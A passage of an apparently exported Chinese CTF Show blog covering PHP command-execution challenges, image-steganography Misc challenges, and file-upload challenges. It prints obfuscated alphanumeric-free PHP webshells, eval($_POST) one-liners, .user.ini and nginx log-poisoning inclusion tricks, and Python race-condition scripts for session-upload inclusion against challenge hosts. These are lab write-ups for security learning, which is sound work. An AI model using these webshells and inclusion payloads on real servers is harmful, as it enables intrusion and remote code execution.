A$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__; // S$___.=$__; // S$__=$_;$__++;$__++;$__++;$__++; // E $___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // R$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T$___.=$__;$____=&#x27;_&#x27;;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // P$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // O$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // S$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T$____.=$__;$_=$$____;eval($___($_[_])); // ASSERT($_POST[_]); system() 1&lt;?php$_=C;//$_=$_[0]; //Cprint_r($_);$___=$_;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___=$__; // Sprint_r($__);//$__=$_;$__++;$__++;$__++;$__++;$__++;$__++; // Y$___.=$__;print_r($__);$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__; // Sprint_r($__);$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__; // Tprint_r($__);$__=$_;$__++;$__++;$___.=$__; // Eprint_r($__);$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__; // Mprint_r($__);print_r($___); //SYSTEM$____=_;$__=$_;//print_r($_);$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // P$____.=$__;print_r($__);$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // O$____.=$__;print_r($__);$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // S$____.=$__;print_r($__);$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T$____.=$__;print_r($____);//_POSTprint_r($___);//SYSTEM$_=$$____;eval($___($_[_])); // SYSTEM($_POST[_]); 1&lt;?php//$_=[C];$_=$_[0];$___=$_;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___=$__;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$____=&#x27;_&#x27;;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$_=$$____;eval($___($_[_]));//$_=C;$___=$_;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___=$__;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$____=_;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$_=$$____;eval($___($_[_]));highlight_file(__FILE__);$a = $_GET[&#x27;a&#x27;];if (!preg_match(&quot;/[!@#%^&amp;*:&#x27;\\&quot;|`a-zA-BD-Z~\\\\\\\\]|[4-9]/&quot;,$ctfshow))&#123; echo &#x27;111&#x27;; eval($a);&#125; 1#get?looklook=1#postctf[show=%24_%3DC%3B%24___%3D%24_%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24___%3D%24__%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24___.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24___.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24___.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24___.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24___.%3D%24__%3B%24____%3D_%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24____.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24____.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24____.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24____.%3D%24__%3B%24_%3D%24%24____%3B%24___(%24_%5B_%5D)%3B&amp;_=ls; 长度限制： 1# get?looklook=1&amp;1=passthru&amp;2=tac /flag.txt# postctf[show=$_=C;$_++;$C=++$_;$_++;$C_=++$_;$_=(C/C.C)&#123;0&#125;;$_++;$_++;$_++;$_++;$_++;$_=_.$C_.$C.++$_;$&#123;$_&#125;&#123;1&#125;($&#123;$_&#125;&#123;2&#125;); 吃瓜 50 4B 03 04 ZIP文件 这是用来迷惑的 存在一个文本文档，是个 图片，浏览器访问 扫描得到 cfhwc19abika_etso{h_u_e_ui1} 查看图片属性 1✿❇✼❄✿❇✼❂❃❆✿✽❂❁❉✼==# 不知道怎末用 二、总结命令执行做题思路 一眼就有思路的直接掠过 一眼没有思路的，首先根据正则的过滤分类，决定思路 有回显？无回显？ eval exec eval 还是 system 无字母数字类？ 异或？或？取反？自增？ 过滤 ; 过滤 ‘ ‘ “ “ 找 phpinfo() 看被 ban 的函数名","categories":[{"name":"CTF Show","slug":"CTF-Show","permalink":"https://xizhi-future.github.io/categories/CTF-Show/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://xizhi-future.github.io/tags/CTF/"}],"author":"xizhi-future"},{"title":"CTF-Show-Misc入门","slug":"CTF-Show-Misc入门","date":"2021-10-01T11:17:47.000Z","updated":"2021-10-01T11:18:54.358Z","comments":true,"path":"2021/10/01/CTF-Show-Misc入门/","link":"","permalink":"https://xizhi-future.github.io/2021/10/01/CTF-Show-Misc%E5%85%A5%E9%97%A8/","excerpt":"CTF Show Misc 入门篇。","text":"CTF Show Misc 入门篇。 Misc 入门1.1 misc 1 — QQ截图 直接识别图片内容 图片直接是这个，我们可以 QQ 截图，使用当中的 屏幕识别 即可识别出文字 1.2 misc 2 — png 图片识别 记事本打开是这样，那肯定不是 .txt 文本文件 使用 Editor010 打开 说明这是 png 文件，修改后缀，然后 QQ 屏幕识图即可 补充知识：Python3 进行图片识别 https://segmentfault.com/a/1190000014091417 1.3 misc 3 — 查看 bpg 图片是 bpg 图片，需要专门的查看工具 https://bellard.org/bpg/ 12# 使用\\bpj\\bpgview.exe misc3.bpg 1.4 misc 4 — 图片格式 + 文件头图片格式 JPEG文件头：FF D8 FF 文件尾：FF D9 TGA未压缩的前4字节 00 00 02 00RLE压缩的前5字节 00 00 10 00 00 PNG 文件头：89 50 4E 47 0D 0A 1A 0A 文件尾：AE 42 60 82 GIF 文件头：47 49 46 38 39(37) 61 文件尾：00 3B BMP 文件头：42 4D 文件头标识(2 bytes) 42(B) 4D(M) TIFF (tif) 文件头：49 49 2A 00 ico 文件头：00 00 01 00 Adobe Photoshop (psd) 文件头：38 42 50 53 一个一个查看，修改后缀 1.txt png 2.txt jpg 3.txt bmp 4.txt gif 5.txt tif 6.txt webp 1.5 misc 5 — png 文件尾 添内容 010打开 发现在 png 的文件尾后面多出了 1.6 misc 6 — jpg 文件 添内容 1.7 misc 7 — flag在图片文件信息中flag在图片文件信息中。 常用到的手段还有 右键–属性 工具 图虫查看器 能够查看图片的详细信息 1.8 misc 8 — flag在图片文件中图片文件中 — binwalk foremostflag在图片文件中图片文件中。 010 打开 可以发现，该 png 图片当中 还包含着一张 png 图片 图片隐藏文件 binwalk foremost https://blog.csdn.net/Sc0fie1d/article/details/101602492 1.9 misc 9 — flag在图片块里 1.10 misc 10 — flag在图片数据里 两个 IDAT 块 binwalk 工具 解释：zlib 是 PNG IDAT 块数据可选的压缩格式 题者自己生成了一段 zlib 压缩数据，然后加上长度位、标识位、与 CRC 校验位，将其伪装成了一个 IDAT 块，插在图片当中 而 binwalk 会自动找到 zlib 块并提取出来解压，所以最终得到的提取结果中就含有 flag 了 1.11 misc 11 — flag在另一张图里 两个 IDAT 块 再次使用上一关的解法，不可行 搜集资料之后，必须首先将多余的那个 IDAT 块删除才可 工具 tweakpng 将第一个 IDAT 块右键删除即可 ctfshow{44620176948fa759d3eeafeac99f1ce9} 1.12 misc 12 — flag在另一张图里flag在另一张图里。 与上一关的做法相同，只不过，不确定删除几个 IDAT 块，每次删完一个保存尝试查看即可 1.13 misc 13 — flag位置在图片末尾flag位置在图片末尾。 可以看到一部分类似 flag 的字符串 我们将乱七八糟的删除即可，每隔一个删除一个 1.14 misc 14 — flag在那张图里flag在那张图里。 记得从 FF D8 开始 新建一个新的文件 jpg 打开 注意：QQ识图 有时不准确，比如 0 和 8 1.15 misc 15 — flag被跳过去了 1.16 misc 16 — flag在图片数据里flag在图片数据里。 binwalk 提取文件 1.17 misc 17 — flag在图片数据里 — zstegflag在图片数据里。 zsteg 安装 及 使用 zsteg可以检测PNG和BMP图片里的隐写数据。 目前，zsteg支持检测： LSB steganography in PNG &amp; BMPzlib-compressed dataOpenStegoCamouflage 1.2.1LSB with The Eratosthenes set 1zsteg misc17.png 12zsteg -E &quot;extradata:0&quot; misc17.png &gt; 1.txtbinwalk -e 1.txt 1.18 misc 18 — flag在标题、作者、照相机和镜头型号里flag在标题、作者、照相机和镜头型号里。 右键属性查看 1.19 misc 19 — flag在主机上的文档名里 1.20 misc 20 — flag在评论里图虫查看器 https://exif.tuchong.com/ ctfshow{c97964b1aecf06e1d79c21ddad593e42} 1.21 misc 21 — flag在序号里flag在序号里。 12print(hex(3902939465)+hex(2371618619)+hex(1082452817)+hex(2980145261))0xe8a221490x8d5c073b0x4084eb510xb1a1686d 删掉 0x 即可 1.22 misc22 — flag 在图片里 — 缩略图 — exiftool 设置为平铺之后，可以依稀看出来该图片下方有着黄色的一行，但是点击查看之后又看不出来 这是一种缩略图隐写的方式，叫做thumbnail隐写 exiftool 1exiftool.exe -ThumbnaiImage -b misc22.jpg &gt; 111.jpg ctfshow{dbf7d3f84b0125e833dfd3c80820a129} 1.23 misc23 — flag在时间里 —exiftool 查看实践 1exiftool.exe misc23.psd ctfshow{}, UnixTimestamp, DECtoHEX, getflag Unix 时间戳，十进制到十六进制，获取 flag 1997:09:22 02:17:02+08:00 2055:07:15 12:14:48+08:00 2038:05:05 16:50:45+08:00 1984:08:03 18:41:46+08:00 在线时间戳转换 874865822 2699237688 2156662245 460377706 12print(hex(874865822)+hex(2699237688)+hex(2156662245)+hex(460377706))0x3425649e0xa0e319380x808c0de50x1b70ce6a ctfshow{3425649ea0e31938808c0de51b70ce6a} 1.24 misc41（本题为Misc入门图片篇和愚人节比赛特别联动题）H4ppy Apr1l F001’s D4y！愚人节到了，一群笨蛋往南飞，一会儿排成S字，一会儿排成B字。 H4ppy Apr1l F001’s D4y！ 这是个提示：F001，010 搜索 F001，发现存在大量，组成了刺目的形状，读取出来即可 ctfshow{fcbd427caf4a52f1147ab44346cd1cdd} 1.25 misc24 — flag在图片上面 — bmp 图片改高度bmp 位图文件解析 900*150=135000个像素大小 该图片总共 675056 个字节，文件尾的位置在675053字节处(后面两个字节是windows的”补0”) 文件头共 53 字节 每个像素点由3个字节（十六进制码6位）表示，每个字节负责控制一种颜色，分别为蓝（Blue）、绿（Green）、红（Red） (675053-53)/3=225000 得到真实的像素大小 该题只有高不对，则正确的宽依旧是 900 得到 225000/900=高 250 修改高为 hex(250)=FA 还是 0096 的位置修改 保存得到flag 1.26 misc25 — flag在图片下面 — png 图片改高度 0096 改成 0196 0296 都可 1.27 misc26 — flag还是在图片下面，但到底有多下面？ ctfshow{94aef1 +True height(hex) of this picture+ 087a7ccf2e28e742efd704c} https://blog.csdn.net/weixin_44145452/article/details/109612189 会提示校验码错误 CRC32是有哪些字节构成的？ PNG文件中总是以固定的八个字节开头 89 50 4E 47 0D 0A 1A 0A 数据块长度3 00 00 00 0D 文件头数据块标示IDCH 49 48 44 52 13位数据块（IHDR）下面为宽和高 00 00 07 7E 00 00 03 60 这5个字节依次为Bit depth，ColorType，Compression method，Filter method，Interlace method 08 06 00 00 00 接下来的四字节为该png图片的CRC校验码 7D C7 3F 7F CRC校验码，由IDCH和IHDR共十七位字节进行crc计算得到 解决方法：1.简单点的隐写题，可以直接修改宽高，然后显示flag2.那么如果修改宽高，并不会直接看到flag，需要放入stegsolve里或者做其它的进一步处理时。这里会产生一个问题，那就是修改过宽高的图片stegsolve无法打开，提示IO错误。这是因为png图像的IHDR段中的高宽被修改，导致计算出来的CRC不正确，所以无法正确读取。通过python2脚本来获取图片高度 获取图片高度 1234567891011# -*- coding: utf-8 -*-import binasciiimport structcrc32key = 0x7DC73F7Ffor i in range(0, 65535): height = struct.pack(&#x27;&gt;i&#x27;, i) #CRC: 7DC73F7F data = &#x27;\\x49\\x48\\x44\\x52\\x00\\x00\\x07\\x7E&#x27; + height + &#x27;\\x08\\x06\\x00\\x00\\x00&#x27; crc32result = binascii.crc32(data) &amp; 0xffffffff if crc32result == crc32key: print &#x27;&#x27;.join(map(lambda c: &quot;%02X&quot; % ord(c), height)) 爆破图片正常宽高 1import structimport zlibdef hexStr2bytes(s): b = b&quot;&quot; for i in range(0,len(s),2): temp = s[i:i+2] b +=struct.pack(&quot;B&quot;,int(temp,16)) return bstr1=&quot;49484452&quot; #文件头数据块标示IDCHstr2=&quot;0806000000&quot; #五字节：Bit depth，ColorType，Compression method，Filter method，Interlace methodbytes1=hexStr2bytes(str1)bytes2=hexStr2bytes(str2)wid,hei = 900,150 #宽高 像素crc32 = &quot;0xec9ccbc6&quot; #校验码for w in range(wid,wid+2000): for h in range(hei,hei+2000): width = hex(w)[2:].rjust(8,&#x27;0&#x27;) height = hex(h)[2:].rjust(8,&#x27;0&#x27;) bytes_temp=hexStr2bytes(width+height) if eval(hex(zlib.crc32(bytes1+bytes_temp+bytes2))) == eval(crc32): print(hex(w),hex(h)) ctfshow{94aef1 +True height(hex) of this picture+ 087a7ccf2e28e742efd704c} 1ctfshow&#123;94aef125e087a7ccf2e28e742efd704c&#125; 1.28 misc27 — flag在图片下面 寻找 0096 1.29 misc28 — flag在图片下面 — gif9600 更改为 FF00，两处 gif.bt ??????? 1.30 misc29 — flag在图片下面9600 更改为 FF00，十处，然后 stegsolve 逐帧查看 1.31 misc30 — 正确的宽度是950修改 bmp 宽度为 hex(950) 1.32 misc31 — 高度是正确的，但正确的宽度是多少呢同 misc24 图片总共 487256 字节，去掉文件尾，得到 487253 900*150=135000 文件头 53 字节 (487253-53)/3=162400 高正确，150 宽：162400/150=1082.67 改宽为 1082 1.33 misc32 — 高度是正确的，但正确的宽度是多少呢png 计算宽高 1import structimport zlibdef hexStr2bytes(s): b = b&quot;&quot; for i in range(0,len(s),2): temp = s[i:i+2] b +=struct.pack(&quot;B&quot;,int(temp,16)) return bstr1=&quot;49484452&quot; #文件头数据块标示IDCHstr2=&quot;0802000000&quot; #五字节：Bit depth，ColorType，Compression method，Filter method，Interlace methodbytes1=hexStr2bytes(str1)bytes2=hexStr2bytes(str2)wid,hei = 900,150 #宽高 像素crc32 = &quot;0xe14a4c0b&quot; #校验码for w in range(wid,wid+2000): for h in range(hei,hei+2000): width = hex(w)[2:].rjust(8,&#x27;0&#x27;) height = hex(h)[2:].rjust(8,&#x27;0&#x27;) bytes_temp=hexStr2bytes(width+height) if eval(hex(zlib.crc32(bytes1+bytes_temp+bytes2))) == eval(crc32): print(hex(w),hex(h)) 0x414 0x96 1.34 misc33 — 出题人丧心病狂，把高度也改了1import zlibimport struct# 同时爆破宽度和高度filename = &quot;misc33.png&quot;with open(filename, &#x27;rb&#x27;) as f: all_b = f.read() data = bytearray(all_b[12:29]) n = 4095 for w in range(n): width = bytearray(struct.pack(&#x27;&gt;i&#x27;, w)) for h in range(n): height = bytearray(struct.pack(&#x27;&gt;i&#x27;, h)) for x in range(4): data[x+4] = width[x] data[x+8] = height[x] crc32result = zlib.crc32(data) #替换成图片的crc if crc32result == 0x5255a798: print(&quot;宽为：&quot;, end = &#x27;&#x27;) print(width, end = &#x27; &#x27;) print(int.from_bytes(width, byteorder=&#x27;big&#x27;)) print(&quot;高为：&quot;, end = &#x27;&#x27;) print(height, end = &#x27; &#x27;) print(int.from_bytes(height, byteorder=&#x27;big&#x27;)) 宽为：bytearray(b’\\x00\\x00\\x03\\xd2’) 978高为：bytearray(b’\\x00\\x00\\x00\\x8e’) 142 1.35 misc34 — 出题人狗急跳墙，把IHDR块的CRC也改了，但我们知道正确宽度肯定大于9001.36 misc351.37 misc361.38 misc37 — flag在图片里StegSolve 帧图分析 ctfshow{2056782cd57b13261dcbbe3d6eecda17} 1.39 misc38 — flag在图片里 使用浏览器打开，即可发现会动 APNG 图片分解器 ctfshow{48b722b570c603ef58cc0b83bbf7680d} 1.40 misc39 — flag就像水，忽快忽慢地流这题也是一个gif，不过这里是利用不同帧之间的间隔时间来隐写的。 1.41 misc40 — flag就像歌，有长有短仿佛岁月悠悠apng 帧分离，换成了apng的帧时间间隔隐写 1flag=&quot;&quot;for i in range(28,69): #flag内容从28位开始 f = open(&#x27;apngframe&#x27;+str(i)+&#x27;.txt&#x27;) s = f.read() flag += chr(int(s.split(&quot;/&quot;)[0][6:]))print(flag)","categories":[{"name":"CTF Show","slug":"CTF-Show","permalink":"https://xizhi-future.github.io/categories/CTF-Show/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://xizhi-future.github.io/tags/CTF/"}],"author":"xizhi-future"},{"title":"CTF-Show-文件上传","slug":"CTF-Show-文件上传","date":"2021-10-01T11:16:29.000Z","updated":"2021-10-01T11:17:15.184Z","comments":true,"path":"2021/10/01/CTF-Show-文件上传/","link":"","permalink":"https://xizhi-future.github.io/2021/10/01/CTF-Show-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/","excerpt":"CTF Show 文件上传篇。","text":"CTF Show 文件上传篇。 CTF Show — 文件上传1.1 Web 151 — 前端验证 手动删除前端验证，好像没什么作用，尝试之后发现，只能成功上传 .png 图片，其实查看源代码后有 所以只能上传 .png ，我们上传 1.png 然后抓包手动修改 蚁剑连接即可 1.2 Web 1521后端不能单一校验 同上 1.3 Web 153 — .user.ini由于服务器是 nginx ，则可尝试上传 .user.ini 再上传 111.png 访问与 111.png 同目录下的 index.php 文件 即 /upload/index.php ，使用 蚁剑连接即可 1.4 Web 154 — 大小写绕过 php这次尝试之后发现进行了内容判断，只能使用图片木马 发现 .user.ini 仍旧可以上传 但是内容过滤了 php ,想办法找一些不含有 php 的一句话 1234567891011121314151617181920212223241:XML风格，也是官方推荐的形式&lt;?php @eval($_POST[1]);?&gt; 2:短标记&lt;? @eval($_POST[1]);?&gt;需要开启配置参数short_open_tags=on&lt;?= @eval($_POST[1]);自 PHP 5.4 起，短格式的 echo 标记 &lt;?= 总会被识别并且合法，而不管 short_open_tag 的设置是什么。&lt;? echo &#x27;123&#x27;;?&gt; //short_open_tags=on&lt;?=(表达式)?&gt; 等价于 &lt;?php echo (表达式)?&gt; //无限制3:ASP风格&lt;% @eval($_POST[1]); %&gt; ASP风格标记仅在通过php.ini配置文件中的指令asp_tags打开后才可用。&lt;% echo &#x27;123&#x27;;%&gt; //asp_tags=on php_version &lt; 74:脚本风格&lt;script language=&quot;php&quot;&gt; echo &quot;666&quot;;&lt;/script&gt; PHP 7.0.0以后失效 本题发现可以大小写进行绕过 蚁剑显示不出具体文件时，尝试进行终端查看 1# 过滤了 php，没过滤大小写 1.5 Web 155 — 短标签绕过 php1# 过滤了 php，过滤了大小写 同上 可使用短标签绕过 php 1.6 Web 156 — { } 代替 [ ]1# 过滤了 php，大小写，[]符号 之后同上 1.7 Web 157-159 — 命令执行1# 过滤了 php，大小写，[]，&#123;&#125;，; 转换思路，不上传一句话了，直接 命令执行 12345&lt;? system(&quot;nl ../f*&quot;)?&gt;&lt;?=(system(&#x27;nl ../f*&#x27;))?&gt;&lt;?= `nl ../*.p*`?&gt;&lt;?= `nl ../f*`?&gt;&lt;?=(system(&#x27;tac ../f*&#x27;))?&gt; 1.8 Web 160 — 日志包含（过滤 log）1# 过滤了 php，大小写，[]，;，``，log 日志包含 条件 知道日志文件的路径 对日志文件可读 1# 上传 .user.iniauto_prepend_file=123.png# 上传 123.png# nginx 服务器&lt;?=include&quot;/var/log/nginx/access.log&quot;?&gt;# 由于 log 被过滤，进行拼接&lt;?=include&quot;/var/l&quot;.&quot;og/nginx/access.l&quot;.&quot;og&quot;?&gt; 将 .user.ini 和 123.png 都成功上传之后，访问 /upload/index.php 抓包在 User-Agent 中添入代码，访问即可 1&lt;?php system(&#x27;cat ../flag.php&#x27;); ?&gt; 流程 访问 /upload/index.php 由于 .user.ini 的配置，将首先自动包含文件 123.png 由于是 包含 文件 123.png ，将会自动执行其中的代码 即包含 /var/log/nginx/access.log 日志文件 而我们再在日志文件当中写入 恶意代码，就将会被执行 1.9 Web 161 — 文件头 GIF89a 写入无法上传 .user.ini 验证了图片内容，即必须包含文件头 在 Web 160 的基础上添加 文件头 GIF89a 或者是 PNG 图片的 文件幻术 1.10 Web 162-163 — session 文件包含继续使用上述 日志 包含，发现上传 .user.ini 时，文件内容 过滤掉了 . 过滤掉了 . session 包含 1# 上传 .user.iniGIF89aauto_prepend_file=test 1# 上传 testGIF89a&lt;?=include&quot;/tmp/sess_test&quot;?&gt; 构造 POST 数据包 1&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;body&gt;&lt;form action=&quot;http://e2f78cd5-b2b8-40b9-8104-7dc18214350b.challenge.ctf.show:8080/&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;123&quot; /&gt; &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt; &lt;input type=&quot;submit&quot; value=&quot;submit&quot; /&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt; 任意上传一个文件，抓包修改，写入代码，进行爆破 然后访问 /upload/index.php 页面进行抓包，爆破 以上两个包同时进行爆破，得到 flag 流程 上传 .user.ini 上传 test 访问 /upload/index.php ，由于 .user.ini 的配置，首先包含 test 文件，紧接着执行其中代码，即包含 /tmp/sess_test 包含 sess_test ，即执行其中的 php 代码，即显示出 flag.php 1# 脚本# coding=utf-8import ioimport requestsimport threadingsessID = &#x27;test&#x27;url = &#x27;http://04198aac-59f1-406e-a656-1af6186d2ff1.challenge.ctf.show:8080/&#x27;def write(session): while event.isSet(): f = io.BytesIO(b&#x27;a&#x27; * 256 * 1) response = session.post( url, cookies=&#123;&#x27;PHPSESSID&#x27;: sessID&#125;, data=&#123;&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;: &#x27;&lt;?php system(&quot;nl ../*.php&quot;);?&gt;&#x27;&#125;, files=&#123;&#x27;file&#x27;: (&#x27;test.txt&#x27;, f)&#125; )def read(session): while event.isSet(): response = session.get(url + &#x27;upload/index.php&#x27;.format(sessID)) if &#x27;flag&#x27; in response.text: print(response.text) event.clear() else: print(&#x27;[*]retrying...&#x27;)if __name__ == &#x27;__main__&#x27;: event = threading.Event() event.set() with requests.session() as session: for i in range(1, 30): threading.Thread(target=write, args=(session,)).start() for i in range(1, 30): threading.Thread(target=read, args=(session,)).start() 1# 条件竞争# coding=utf-8import requestsimport threadingsession=requests.session()sess=&#x27;test&#x27;url1=&quot;http://04198aac-59f1-406e-a656-1af6186d2ff1.challenge.ctf.show:8080/&quot;url2=&quot;http://04198aac-59f1-406e-a656-1af6186d2ff1.challenge.ctf.show:8080/upload&quot;data1=&#123; &#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;:&#x27;&lt;?php system(&quot;tac ../f*&quot;);?&gt;&#x27;&#125;file=&#123; &#x27;file&#x27;:&#x27;test&#x27;&#125;cookies=&#123; &#x27;PHPSESSID&#x27;: sess&#125;def write(): while True: r = session.post(url1,data=data1,files=file,cookies=cookies)def read(): while True: r = session.get(url2) if &#x27;flag&#x27; in r.text: print(r.text) threads = [threading.Thread(target=write), threading.Thread(target=read)]for t in threads: t.start() 1.11 Web 164 — png 二次渲染1&lt;?php$p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23, 0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae, 0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc, 0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f, 0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c, 0xa1, 